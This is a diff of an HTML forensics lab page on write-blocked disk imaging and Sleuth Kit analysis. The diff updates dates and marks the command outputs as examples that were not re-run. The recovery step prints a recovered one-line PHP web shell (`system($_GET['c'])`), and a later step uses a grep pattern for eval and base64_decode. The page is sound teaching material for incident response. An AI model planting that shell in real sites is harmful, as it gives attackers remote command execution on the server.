@@ -41,12 +41,12 @@
     <link rel="help" href="../../../humans.txt">
   <link rel="security" href="../../../.well-known/security.txt">
 <link rel="manifest" href="../../../site.webmanifest">
-  <script type="application/ld+json">{"@context": "https://schema.org", "@type": ["TechArticle", "LearningResource"], "headline": "Dead Box Forensics: Disk Imaging and Analysis", "author": {"@type": "Person", "@id": "https://tyfsadik.org/#person", "name": "MD. Taki Yasir Faraji Sadik", "url": "https://tyfsadik.org/about.html", "sameAs": ["https://github.com/TYFSADIK"]}, "datePublished": "2025-06-17", "dateModified": "2026-09-29", "proficiencyLevel": "Advanced", "dependencies": "dd, The Sleuth Kit 4.12, Autopsy, write blocker", "articleSection": "Security", "learningResourceType": "Hands-on lab", "teaches": "cybersecurity and security operations", "speakable": {"@type": "SpeakableSpecification", "cssSelector": [".lead", ".faq"]}, "keywords": ["dead box forensics", "disk imaging", "write blocker", "Sleuth Kit", "dd", "chain of custody", "mmls", "fls", "dead box forensics explained", "dead box forensics lab", "dead box forensics guide", "dead box forensics tutorial", "dead box forensics homelab", "disk imaging lab"], "about": [{"@type": "Thing", "name": "Animation"}, {"@type": "Thing", "name": "HTML"}, {"@type": "Thing", "name": "Linux"}, {"@type": "Thing", "name": "PHP"}]}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": ["TechArticle", "LearningResource"], "headline": "Dead Box Forensics: Disk Imaging and Analysis", "author": {"@type": "Person", "@id": "https://tyfsadik.org/#person", "name": "MD. Taki Yasir Faraji Sadik", "url": "https://tyfsadik.org/about.html", "sameAs": ["https://github.com/TYFSADIK"]}, "datePublished": "2025-06-17", "dateModified": "2026-11-14", "proficiencyLevel": "Advanced", "dependencies": "dd, The Sleuth Kit 4.12, Autopsy, write blocker", "articleSection": "Security", "learningResourceType": "Hands-on lab", "teaches": "cybersecurity and security operations", "speakable": {"@type": "SpeakableSpecification", "cssSelector": [".lead", ".faq"]}, "keywords": ["dead box forensics", "disk imaging", "write blocker", "Sleuth Kit", "dd", "chain of custody", "mmls", "fls", "dead box forensics explained", "dead box forensics lab", "dead box forensics guide", "dead box forensics tutorial", "dead box forensics homelab", "disk imaging lab"], "about": [{"@type": "Thing", "name": "Animation"}, {"@type": "Thing", "name": "HTML"}, {"@type": "Thing", "name": "Linux"}, {"@type": "Thing", "name": "PHP"}]}</script>
   <meta property="og:title" content="Dead Box Forensics Explained: Security Lab | TYFSADIK">
   <meta property="og:description" content="Perform dead box forensics: write-blocked disk acquisition, pre/post hash verification, Sleuth Kit carving, deleted-file recovery, and timeline building.">
   <meta property="og:type" content="article">
   <meta property="article:published_time" content="2026-09-30T00:00:00-04:00">
-  <meta property="article:modified_time" content="2026-10-22T05:41:50-04:00">
+  <meta property="article:modified_time" content="2026-11-14T00:00:00-05:00">
   <meta property="og:url" content="https://tyfsadik.org/blog/labs/security/dead-box-forensics.html">
   <meta property="og:site_name" content="TYFSADIK">
   <meta property="article:tag" content="dead box forensics">
@@ -180,7 +180,7 @@
 
     <nav class="breadcrumb" aria-label="Breadcrumb"><a href="../../../index.html">Home</a> &rsaquo; <a href="../../../blog/labs/index.html">Labs</a> &rsaquo; <a href="../../../blog/labs/security/index.html">Security</a> &rsaquo; <span>Dead Box Forensics</span></nav>
     <div class="page-header"><h1>Dead Box Forensics: Write-Blocked Disk Imaging and Analysis</h1>
-      <p class="byline">Written by <a href="../../../about.html">Taki Sadik</a> &middot; Last updated <time datetime="2026-10-22">2026-10-22</time> &middot; 29 min read</p>
+      <p class="byline">Written by <a href="../../../about.html">Taki Sadik</a> &middot; Last updated <time datetime="2026-11-14">2026-11-14</time> &middot; 29 min read</p>
       <div class="lab-meta"><span class="difficulty difficulty-advanced">Advanced</span><span class="lab-category">Security</span><span class="lab-time">~6 hours</span></div>
       <div class="tags" style="margin-top:0.75rem;"><span class="tag">Autopsy</span><span class="tag">dd</span><span class="tag">Sleuth Kit</span><span class="tag">write blocker</span></div>
     </div>    <nav class="lab-toc" aria-label="On this page"><strong>On this page</strong>
@@ -246,7 +246,8 @@ flowchart LR
         </ul>
       <p class="code-label">Verify tools and free space before touching the evidence</p>
       <div class="command-block"><div class="command"><code>which dd sha256sum mmls fls icat &amp;&amp; df -h /evidence</code></div></div>
-<pre><code class="language-bash">/usr/bin/dd
+      <p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
+<pre><code>/usr/bin/dd
 /usr/bin/sha256sum
 /usr/bin/mmls
 /usr/bin/fls
@@ -264,12 +265,13 @@ Blocker:       Tableau T8u (firmware 2.19)</code></pre>
 </section>
 
     <section id="step-by-step-execution"><h2>Step-by-Step Execution</h2>
+      <p class="lab-step-note lab-rerun-note">The steps on this page were not re-run on 14 November 2026: it needs the evidence drive from the original case. The outputs shown are examples from the original lab environment, and each is marked as such.</p>
 
       <h3>1. Connect the evidence drive through the write blocker</h3>
       <p>Power the workstation first, then attach the source disk through the write blocker. Watch the kernel log as it enumerates: the drive should appear as a block device <em>without</em> any filesystem being auto-mounted. Auto-mounting is the number-one way beginners contaminate evidence, because even a read-only <code>mount</code> can replay a journal (ext3/4, NTFS) and alter the disk unless the blocker stops the writes.</p>
       <p class="code-label">Identify the new device and confirm nothing mounted it</p>
       <div class="command-block"><div class="command"><code>sudo dmesg | tail -n 20 &amp;&amp; lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,RO</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">[  412.338102] sd 3:0:0:0: [sdb] 250069680 512-byte logical blocks: (128 GB/119 GiB)
 [  412.339215] sd 3:0:0:0: [sdb] Write Protect is off
 [  412.339221] sd 3:0:0:0: [sdb] Mode Sense: 00 3a 00 00
@@ -287,7 +289,7 @@ sdc    1.8T disk ext4   /evidence        0</code></pre>
       <p>Before any acquisition, capture the make, model, serial number, and capacity. This ties the physical item in the evidence bag to the image you are about to create, and it is the first thing opposing counsel or a reviewer will check. A hash alone does not identify a drive, only the combination of serial number, capacity, and hash does.</p>
       <p class="code-label">Pull device metadata for the custody log</p>
       <div class="command-block"><div class="command"><code>sudo smartctl -i /dev/sdb | egrep 'Model|Serial|Capacity'</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">Device Model:     Samsung SSD 860 EVO 128GB
 Serial Number:    S3Y9NB0K123456A
 User Capacity:    128,035,676,160 bytes [128 GB]</code></pre>
@@ -297,14 +299,14 @@ User Capacity:    128,035,676,160 bytes [128 GB]</code></pre>
       <p>Hash the raw device <em>before</em> imaging, on healthy media. This pre-acquisition hash is the baseline the finished image will be compared against. Hashing the whole device (not just partitions) captures the partition table, slack between partitions, and every byte dd will later read. If the drive is already showing read errors or SMART warnings, skip this standalone pass: reading a failing drive twice stresses it, and bad sectors can return different data on each attempt. For failing media, image with ddrescue first (see Troubleshooting), which keeps a map file and logs progress per region, then hash the source regions it read successfully. SHA-256 is the modern baseline; MD5 appears in older case law but is collision-broken and should not be the only hash used. Some teams record both SHA-256 and SHA-1 in parallel (<code>sha256sum</code> and <code>sha1sum</code> in the same pass via <code>tee</code>) purely so older tooling can cross-check later.</p>
       <p class="code-label">SHA-256 the raw source device</p>
       <div class="command-block"><div class="command"><code>sudo sha256sum /dev/sdb | tee /evidence/sdb.pre-acquisition.sha256</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">a1b2c3d4e5f6...  /dev/sdb</code></pre>
       <p>On a 128 GB SSD over USB 3 this takes roughly 5 to 10 minutes. Use <code>tee</code> so the value lands in a file as well as on screen, never retype a hash by hand. <strong>Common mistake:</strong> hashing <code>/dev/sdb1</code> instead of <code>/dev/sdb</code>, which skips the partition table and unpartitioned space where data can hide. Verify you hashed the right object by confirming the command references the whole-disk node, and keep the <code>.sha256</code> file next to the image so the pair can never be separated.</p>
 <p class="lab-step-note">What this teaches: the pre-acquisition hash is the baseline every later integrity claim is measured against.</p>
 <h3>4. Acquire a bit-for-bit image [ROOT REQUIRED]</h3>
       <p>dd reads every sector of the source sequentially and writes it to the destination file. The flags matter: <code>bs=4M</code> uses a 4 MiB block size for throughput; <code>conv=noerror,sync</code> tells dd to keep going past a bad sector (<code>noerror</code>) and to pad the unreadable block with zeros in the output (<code>sync</code>) so every subsequent byte stays at the correct offset, without <code>sync</code>, one bad sector silently shifts the entire rest of the image; <code>status=progress</code> prints live throughput so a stalled drive is visible immediately.</p>
       <div class="command-block"><div class="command"><code>sudo dd if=/dev/sdb of=/evidence/case.img bs=4M conv=noerror,sync status=progress</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">128035676160 bytes (128 GB, 119 GiB) copied, 432.18 s, 296 MB/s
 30526+1 records in
 30526+1 records out</code></pre>
@@ -315,7 +317,7 @@ User Capacity:    128,035,676,160 bytes [128 GB]</code></pre>
 <h3>5. Verify acquisition integrity</h3>
       <p>Hash the source device a second time and the image file, in the same command, and compare. Three values are now in play, pre-acquisition hash, post-acquisition source hash, and image hash, and all three must be identical. Source pre vs. post proves the acquisition did not alter the evidence; source vs. image proves the copy is exact.</p>
       <div class="command-block"><div class="command"><code>sudo sha256sum /dev/sdb /evidence/case.img</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">a1b2...  /dev/sdb
 a1b2...  /evidence/case.img   # match = sound acquisition</code></pre>
       <p>Append the result to the custody log as a self-contained entry, anyone reading the log months later should be able to reconstruct exactly what was done without asking you:</p>
@@ -332,7 +334,7 @@ a1b2...  /evidence/case.img   # match = sound acquisition</code></pre>
       <p>The verified image is now the master. Before any analysis, make a working copy and hash it, so that a mistake during analysis (an accidental mount, a tool that writes alongside the image) can never force a re-acquisition from the original, you just re-copy from the master. Then mark the master read-only at the filesystem level.</p>
       <p class="code-label">Copy, hash, and lock down the master</p>
       <div class="command-block"><div class="command"><code>cp /evidence/case.img /evidence/work.img &amp;&amp; sha256sum /evidence/work.img &amp;&amp; chmod 444 /evidence/case.img</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">a1b2c3d4e5f6...  /evidence/work.img   # identical to master = clean copy</code></pre>
       <p>All Sleuth Kit commands below run against <code>case.img</code> because TSK never writes to the image; anything interactive or exploratory should target <code>work.img</code>. <strong>Verify:</strong> the working-copy hash matches the master hash exactly, and <code>ls -l</code> shows the master as <code>-r--r--r--</code>. Treat that mode as a tripwire, not a guarantee: root can <code>chmod</code> it back in one command, so the real protection is the recorded hash, the read-only bit just makes accidental writes noisy. <strong>Common mistake:</strong> skipping this step on a deadline. A re-acquisition means pulling the original back out of evidence storage, re-hashing, and re-logging the entire chain of custody, far more expensive than one copy.</p>
 <p class="lab-step-note">What this teaches: the master image is evidence; all analysis happens on working copies.</p>
@@ -340,7 +342,7 @@ a1b2...  /evidence/case.img   # match = sound acquisition</code></pre>
       <p>All Sleuth Kit tools operate on the image file directly, no mounting required, which is exactly what you want. Start with <code>mmls</code> to read the partition table, because every other tool needs a sector offset to know where a filesystem begins.</p>
       <p class="code-label">List partitions and their sector offsets</p>
       <div class="command-block"><div class="command"><code>mmls /evidence/case.img</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">DOS Partition Table
 Offset Sector: 0
 Units are in 512-byte sectors
@@ -356,12 +358,13 @@ Units are in 512-byte sectors
       <p>Deleted-file recovery via inodes (next steps) only works while the deleted inode's metadata survives. Data whose inode has already been reused or wiped still lives in unallocated blocks, reachable only by pulling those blocks out wholesale. <code>blkls</code> copies every unallocated block of a filesystem into a flat file that carving tools and grep can then work over.</p>
       <p class="code-label">Dump unallocated blocks from the Linux partition</p>
       <div class="command-block"><div class="command"><code>blkls -o 2048 /evidence/case.img > /evidence/unalloc.bin &amp;&amp; ls -lh /evidence/unalloc.bin</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">-rw-r--r-- 1 examiner examiner 31G Jun 17 14:22 /evidence/unalloc.bin</code></pre>
       <p>About 31 GB of this 118 GB partition was unallocated, a large haystack, but the right one: deleted log fragments, prior versions of the web shell, and staging archives all land here. Signature carvers such as <code>photorec</code> or <code>bulk_extractor</code> can be pointed at <code>unalloc.bin</code> directly, and simple string searches often surface readable log lines that no longer belong to any file:</p>
       <p class="code-label">Hunt for attacker IPs and shell invocations in unallocated space</p>
       <div class="command-block"><div class="command"><code>grep -aob 'Failed password' /evidence/unalloc.bin | head -n 5</code></div></div>
-<pre><code class="language-bash">1049887744:Failed password for root from 203.0.113.44 port 51122 ssh2
+      <p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
+<pre><code>1049887744:Failed password for root from 203.0.113.44 port 51122 ssh2
 1049890304:Failed password for invalid user admin from 203.0.113.44 port 51136 ssh2
 1049912320:Failed password for root from 203.0.113.44 port 51201 ssh2</code></pre>
       <p>The <code>-a</code> flag treats the binary blob as text and <code>-b</code> prints byte offsets, so each hit can be re-examined in context with <code>dd if=/evidence/unalloc.bin bs=1 skip=&lt;offset&gt; count=2000</code> or a hex viewer. Here, fragments of the deleted auth log survive in unallocated space and reveal a brute-force source IP, corroborating the recovered <code>auth.log.1</code> from the inode-based recovery below. <strong>Common mistake:</strong> running carvers against the full image instead of just unallocated space, you get every live file duplicated in the output and drown in noise.</p>
@@ -369,7 +372,7 @@ Units are in 512-byte sectors
 <h3>9. Inventory files, including deleted ones, with fls</h3>
       <p><code>fls</code> lists file and directory entries from the filesystem metadata. <code>-r</code> recurses, <code>-d</code> shows deleted entries, and <code>-o 2048</code> points it at the filesystem offset from mmls. Deleted entries are prefixed with <code>*</code> and are the direct leads for the T1070 objective. Each output line gives the entry type (<code>r/r</code> for a regular file, <code>d/d</code> for a directory), the inode number, and the name, the inode is the handle you feed to <code>istat</code> and <code>icat</code>.</p>
       <div class="command-block"><div class="command"><code>fls -rd -o 2048 /evidence/case.img &amp;&amp; icat -o 2048 /evidence/case.img 12345 > recovered.bin</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">r/r 4:      var
 + r/r 11:   log
 ++ r/r * 12345:    auth.log.1   (deleted)
@@ -382,7 +385,7 @@ r/r 5021:   var/www/html
       <p>Before extracting, <code>istat</code> shows what metadata survives for the deleted inode: timestamps, size, and the block pointers that make recovery possible. Then <code>icat</code> streams the inode's data blocks to a file.</p>
       <p class="code-label">Check inode metadata for the deleted web shell</p>
       <div class="command-block"><div class="command"><code>istat -o 2048 /evidence/case.img 12398</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">inode: 12398
 Not Allocated
 Group: 2
@@ -396,7 +399,8 @@ Direct Blocks: 88412</code></pre>
       <div class="command-block"><div class="command"><code>fls -rd -o 2048 /evidence/case.img &amp;&amp; icat -o 2048 /evidence/case.img 12345 > recovered.bin</code></div></div>
       <p class="code-label">Also recover the web shell and fingerprint it</p>
       <div class="command-block"><div class="command"><code>icat -o 2048 /evidence/case.img 12398 > recovered_cmd.php &amp;&amp; file recovered_cmd.php &amp;&amp; sha256sum recovered_cmd.php</code></div></div>
-<pre><code class="language-bash">recovered_cmd.php: PHP script, ASCII text
+      <p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
+<pre><code>recovered_cmd.php: PHP script, ASCII text
 9f8e7d6c...  recovered_cmd.php</code></pre>
 <pre><code class="language-php">&lt;?php if(isset($_GET['c'])){ system($_GET['c']); } ?&gt;</code></pre>
       <p>The recovered file is a one-line web shell, a textbook T1505.003 artifact. Hash every recovered file so it can be searched against threat intel feeds and cited in the report. <strong>Verify:</strong> <code>file</code> identifies the expected type and the content is coherent, not binary garbage. Garbage usually means the inode was reallocated and its block pointers now belong to a different file, that data is gone from this inode; check unallocated space carving instead.</p>
@@ -405,7 +409,7 @@ Direct Blocks: 88412</code></pre>
       <p>Single artifacts answer "what"; a timeline answers "when" and "in what order". <code>fls -m</code> emits a body file, one pipe-delimited line per file with its MACB (modified, accessed, changed, born) timestamps, and <code>mactime</code> sorts that body file chronologically. Filtering to the intrusion window shows whether the web shell drop, the log deletion, and any known malicious logins line up.</p>
       <p class="code-label">Generate and filter a MAC timeline for the incident window</p>
       <div class="command-block"><div class="command"><code>fls -r -m / -o 2048 /evidence/case.img > /evidence/body.txt &amp;&amp; mactime -b /evidence/body.txt | grep -E 'Jun 1[345] 2025' > /evidence/timeline.csv</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code class="language-bash">Fri Jun 13 2025 22:41:07,412,macb,-rw-r--r--,5021,12398,/var/www/html/cmd.php
 Sat Jun 14 2025 03:16:58,412,.a..,-rw-r--r--,5021,12398,/var/www/html/cmd.php
 Sat Jun 14 2025 03:17:42,0,.a..,-rw-r--r--,11,12345,/var/log/auth.log.1 (deleted)</code></pre>
@@ -427,18 +431,19 @@ Sat Jun 14 2025 03:17:42,0,.a..,-rw-r--r--,11,12345,/var/log/auth.log.1 (deleted
       <p>Sleuth Kit and Autopsy read the image without mounting it, and that should remain the primary method. Occasionally, though, you want to browse the filesystem with ordinary tools, open a config file in an editor, run <code>grep</code> across the web root, or diff a directory against a known-good baseline. That is acceptable on the <em>image</em> (never the original) if and only if the mount is truly read-only: the <code>loop</code> device presents the file as a block device, <code>ro</code> forbids writes, and <code>noload</code> stops ext3/4 from replaying the journal, which would otherwise write into the image file even on a "read-only" mount.</p>
       <p class="code-label">Mount the Linux partition read-only via loop device</p>
       <div class="command-block"><div class="command"><code>sudo mkdir -p /mnt/case &amp;&amp; sudo mount -o ro,loop,noload,offset=$((2048*512)) /evidence/work.img /mnt/case</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code>(no output on success)</code></pre>
 
       <p>The offset is the partition start sector from mmls (2048) multiplied by the sector size (512 bytes), 1,048,576 bytes into the image. Note this mounts <code>work.img</code>, the working copy, not the master. Browse, and confirm the key artifacts are visible from the live filesystem side too:</p>
       <div class="command-block"><div class="command"><code>ls -la /mnt/case/var/www/html/ &amp;&amp; grep -rl 'eval\|base64_decode' /mnt/case/var/www/html/ 2>/dev/null</code></div></div>
-<pre><code class="language-bash">drwxr-xr-x 2 root root 4096 Jun 14 03:17 .
+      <p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
+<pre><code>drwxr-xr-x 2 root root 4096 Jun 14 03:17 .
 drwxr-xr-x 3 root root 4096 Jun 12 11:02 ..
 -rw-r--r-- 1 root root 612 Jun 10 09:14 index.php
 -rw-r--r-- 1 root root 941 Jun 13 21:58 upload.php</code></pre>
       <p>Note that <code>cmd.php</code> does <em>not</em> appear in the live listing, it was deleted, which is exactly why the fls/icat recovery in steps 9 to 10 was necessary. A pure live-filesystem review would have missed the shell entirely; the directory listing shows only what survived deletion. When finished, unmount cleanly:</p>
       <div class="command-block"><div class="command"><code>sudo umount /mnt/case &amp;&amp; sha256sum /evidence/case.img</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the evidence drive from the original case):</p>
 <pre><code>a1b2c3d4e5f6...  /evidence/case.img   # still matches the acquisition hash</code></pre>
 
       <p><strong>Verify:</strong> re-hash the master image after unmounting and confirm it still matches the acquisition hash, this closes the loop on "analysis was non-destructive" for the report. <strong>Common mistake:</strong> forgetting <code>noload</code> on ext filesystems and silently journaling into the image, or mounting the master instead of the working copy. If the hash changed, restore the master from your hash-verified backup procedure and repeat the mount with the correct flags.</p>
